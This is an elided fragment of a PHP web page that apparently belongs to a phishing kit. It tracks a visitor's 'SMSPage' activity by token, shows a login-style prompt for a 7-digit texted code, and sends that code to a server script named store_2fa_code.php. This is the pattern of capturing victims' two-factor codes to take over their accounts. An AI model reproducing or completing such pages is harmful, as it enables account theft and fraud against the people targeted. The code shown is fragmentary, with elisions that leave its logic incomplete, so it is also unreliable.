...
// Update user activity to indicate visiting sms.php
updateActivity($token, "SMSPage");
?>
<!DOCTYPE html>
<html lang="en">
<head>
...
<body>
    <div class="wrapper">
        <div class="login-container">
            ...
            <form class="login-form" action="#">
                <h2>Enter the 7-digit code we texted to +x xxx xxx xx<span>xx</span></h2>
    ...
    <script>
        ...
        function store2FACode() {
            ...
            xhr.open('POST', 'store_2fa_code.php');
            ...
            xhr.onload = function() {
                if (xhr.status === 200) {
                    ...
                    console.error('Error storing 2FA code:', xhr.responseText);
                }
            };
            xhr.send('code=' + code);
        }
